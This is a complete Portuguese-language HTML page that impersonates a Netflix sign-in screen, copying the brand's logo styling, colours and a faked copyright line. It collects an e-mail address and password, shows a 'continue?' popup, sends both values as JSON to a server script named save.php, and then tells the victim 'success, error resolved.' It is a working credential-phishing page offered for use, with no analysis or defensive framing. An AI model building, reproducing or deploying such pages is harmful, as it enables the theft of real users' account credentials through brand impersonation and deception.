<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Netflix DNS</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@400;600&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;font-family:'DM Sans',sans-serif;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;background-image:radial-gradient(ellipse 70% 50% at 50% 0%,rgba(229,9,20,.15) 0%,transparent 70%)}
header{position:fixed;top:0;left:0;right:0;padding:18px 48px;background:linear-gradient(#000 0%,transparent 100%)}
.logo{font-family:'Bebas Neue',sans-serif;font-size:2.4rem;letter-spacing:2px;color:#E50914}
.logo span{color:#fff}
main{width:100%;max-width:420px;padding:20px}
.card{background:rgba(0,0,0,.85);border:1px solid rgba(255,255,255,.1);border-radius:6px;padding:48px 44px 56px;backdrop-filter:blur(12px)}
h1{font-size:1.9rem;font-weight:600;margin-bottom:28px}
.field{position:relative;margin-bottom:16px}
.field label{position:absolute;top:50%;left:14px;transform:translateY(-50%);font-size:.95rem;color:#888;pointer-events:none;transition:.18s ease;transform-origin:left top}
.field input{width:100%;height:54px;background:#333;border:1px solid transparent;border-radius:4px;padding:22px 14px 8px;font-size:.95rem;color:#fff;font-family:inherit;outline:none;transition:background .18s,border-color .18s;caret-color:#E50914}
.field input:focus{background:#3d3d3d;border-color:rgba(229,9,20,.45)}
.field input:focus+label,.field input:not(:placeholder-shown)+label{transform:translateY(-115%) scale(.74);color:#777}
.field input::placeholder{color:transparent}
.eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:#777;cursor:pointer;padding:4px;font-size:1rem;transition:color .15s}
.eye:hover{color:#fff}
.btn{width:100%;height:50px;margin-top:24px;background:#E50914;border:none;border-radius:4px;color:#fff;font-size:1rem;font-weight:600;font-family:inherit;cursor:pointer;transition:background .18s,box-shadow .18s,transform .1s;box-shadow:0 4px 18px rgba(229,9,20,.3)}
.btn:hover{background:#f40612;box-shadow:0 6px 24px rgba(229,9,20,.45);transform:translateY(-1px)}
.btn:active{transform:translateY(0) scale(.99)}
.btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
.foot{text-align:center;margin-top:20px;font-size:.88rem;color:#777}
.foot a{color:#fff;text-decoration:none;font-weight:600}
.foot a:hover{color:#E50914}

/* Overlay */
.overlay{position:fixed;inset:0;z-index:50;background:rgba(0,0,0,.7);backdrop-filter:blur(4px);display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .25s}
.overlay.on{opacity:1;pointer-events:all}
.popup{background:#141414;border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:40px 36px;max-width:360px;width:90%;text-align:center;transform:translateY(16px) scale(.95);transition:transform .28s cubic-bezier(.22,1,.36,1),opacity .25s;opacity:0}
.overlay.on .popup{transform:none;opacity:1}
.icon{width:52px;height:52px;background:rgba(229,9,20,.1);border:1.5px solid rgba(229,9,20,.25);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px;font-size:1.4rem}
.popup h2{font-size:1.2rem;margin-bottom:8px}
.popup p{font-size:.88rem;color:#888;line-height:1.5;margin-bottom:28px}
.actions{display:flex;gap:10px}
.actions button{flex:1;height:44px;border-radius:4px;border:none;font-size:.92rem;font-weight:600;font-family:inherit;cursor:pointer;transition:all .18s}
.no{background:rgba(255,255,255,.07);color:#888;border:1px solid rgba(255,255,255,.12)!important}
.no:hover{background:rgba(255,255,255,.13);color:#fff}
.yes{background:#E50914;color:#fff;box-shadow:0 4px 14px rgba(229,9,20,.3)}
.yes:hover{background:#f40612}
.yes:disabled{opacity:.6;cursor:not-allowed}

/* Toast */
.toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(12px);background:#1a1a1a;border:1px solid rgba(255,255,255,.1);border-radius:6px;padding:12px 22px;font-size:.88rem;z-index:99;opacity:0;transition:all .3s;pointer-events:none;white-space:nowrap}
.toast.on{opacity:1;transform:translateX(-50%)}
.toast.ok{border-color:rgba(46,213,115,.4);color:#2ed573}
.toast.err{border-color:rgba(229,9,20,.4);color:#ff6b6b}

/* Spinner */
@keyframes spin{to{transform:rotate(360deg)}}
.sp{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .65s linear infinite;vertical-align:middle;margin-right:5px}
</style>
</head>
<body>

<header><div class="logo">      Netflix<span></span></div></header>

<main>
  <div class="card">
    <h1>Insira as informações.</h1>

    <div class="field">
      <input type="email" id="em" placeholder=" " autocomplete="email"/>
      <label for="em">E-mail</label>
    </div>

    <div class="field">
      <input type="password" id="pw" placeholder=" " autocomplete="current-password"/>
      <label for="pw">Senha</label>
      <button class="eye" id="eye" type="button"></button>
    </div>

    <button class="btn" id="cont">Continuar</button>
    <p class="foot">©️ 2026 Netflix inc.<a href="#"> Todos os direitos reservados.</a></p>
  </div>
</main>

<div class="overlay" id="ov">
  <div class="popup">
    <div class="icon">🔐</div>
    <h2>Tem Certeza Que Deseja Continuar?</h2>
    <p></p>
    <div class="actions">
      <button class="no" id="bNo">Não</button>
      <button class="yes" id="bYes">Sim, continuar</button>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
const $=id=>document.getElementById(id);

// Eye toggle
$('eye').onclick=function(){
  const i=$('pw'),s=i.type==='password';
  i.type=s?'text':'password';
  this.textContent=s?'':'';
};

// Open popup
$('cont').onclick=function(){
  if(!$('em').value.trim()||!$('pw').value){
    toast('Preencha e-mail e senha.','err');return;
  }
  $('ov').classList.add('on');
};

// Close on backdrop
$('ov').onclick=e=>{if(e.target===$('ov'))close()};

function close(){$('ov').classList.remove('on')}

// Não
$('bNo').onclick=()=>{close();toast('Cancelado. Tente De Novo.','err')};

// Sim → PHP
$('bYes').onclick=async function(){
  this.disabled=true;
  this.innerHTML='<span class="sp"></span>Salvando...';
  try{
    const r=await fetch('save.php',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({email:$('em').value.trim(),password:$('pw').value})
    });
    const d=await r.json();
    close();
    if(d.success){
      toast('✓ Sucesso, Erro Resolvido!','ok');
      $('em').value=$('pw').value='';
    }else toast('Erro: '+d.message,'err');
  }catch{close();toast('Erro de conexão com o servidor.','err')}
  finally{this.disabled=false;this.innerHTML='Sim, continuar'}
};

// Toast
let tt;
function toast(msg,type){
  const el=$('toast');
  el.textContent=msg;
  el.className='toast on '+type;
  clearTimeout(tt);
  tt=setTimeout(()=>el.className='toast',3500);
}
</script>
</body>
</html>
